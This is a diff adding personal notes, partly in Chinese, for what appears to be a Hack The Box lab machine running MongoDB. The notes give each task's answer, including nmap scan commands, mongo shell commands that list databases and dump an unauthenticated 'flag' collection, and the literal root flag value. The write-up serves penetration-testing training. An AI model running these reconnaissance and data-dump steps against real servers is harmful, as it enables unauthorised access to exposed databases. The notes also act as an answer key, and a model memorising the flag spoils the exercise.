@@ -1,0 +1,75 @@
+sudo openvpn ./*.openvpn
+
+ 10.129.228.30
+Read the walkthrough provided, to get a detailed guide on how to pwn this machine. 
+
+task 1:
+    How many TCP ports are open on the machine? 
+aswer:
+    2
+
+    步骤：nmap -P 10.129.228.30
+
+task 2:
+    Which service is running on port 27017 of the remote host? 
+aswer:
+    MongoDB 3.6.8
+
+    步骤：nmap -p 27017 -sV 10.129.228.30
+
+    MongoDB是一种流行的NoSQL数据库管理系统，使用文档导向的数据模型。它是一个开源的跨平台数据库，旨在提供高性能、可扩展性和灵活性。MongoDB的特点包括：
+
+    1. **文档导向**：MongoDB使用BSON（二进制JSON）格式来存储数据，数据以文档的形式组织，类似于JSON对象。
+    
+    2. **灵活的数据模型**：与传统的关系型数据库不同，MongoDB的数据模型非常灵活，可以存储各种类型的数据，不需要严格的预定义模式。
+
+    3. **高性能**：MongoDB具有高性能的特性，支持查询、索引和聚合操作，同时也提供了水平扩展的能力，可以通过分片来处理大规模的数据。
+
+    4. **复制和容错**：MongoDB支持复制集（Replica Set），可以在多个节点之间复制数据，提供数据的冗余备份和容错能力，保证了系统的可用性和可靠性。
+
+    5. **自动分片**：MongoDB支持自动分片（Sharding），可以将数据分散存储在多个节点上，以支持大规模数据集的存储和查询。
+
+    6. **丰富的查询语言**：MongoDB支持丰富的查询语言，包括查询、投影、过滤、排序、聚合等操作，同时也支持地理空间查询和文本搜索等高级功能。
+
+    总的来说，MongoDB是一个功能强大、灵活性高、性能优越的NoSQL数据库，被广泛应用于Web应用、大数据分析、物联网、移动应用等各种场景中。
+
+task 3：
+    What type of database is MongoDB? (Choose: SQL or NoSQL) 
+aswer:
+    NoSQL
+
+task 4:
+    What is the command name for the Mongo shell that is installed with the mongodb-clients package? 
+aswer:
+    mongo
+
+task 5:
+    What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;) 
+aswer:
+    show dbs
+
+task 6:
+    What is the command used for listing out the collections in a database? (No need to include a trailing ;) 
+aswer:
+    show collections
+
+task 7：
+    What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? 
+aswer:
+    db.flag.find().pretty()
+
+
+task 8：
+    Submit root flag
+aswer:
+    1b6e6fb359e7c40241b6d431427ba6ea
+
+    步骤：
+    mongo ip
+    show dbs
+    use sensitive_information
+    show collections
+    db.flag.find().pretty()
+    
+参考资料：
+    https://muserensfangst.blog/2023/04/01/mongod-write-up/
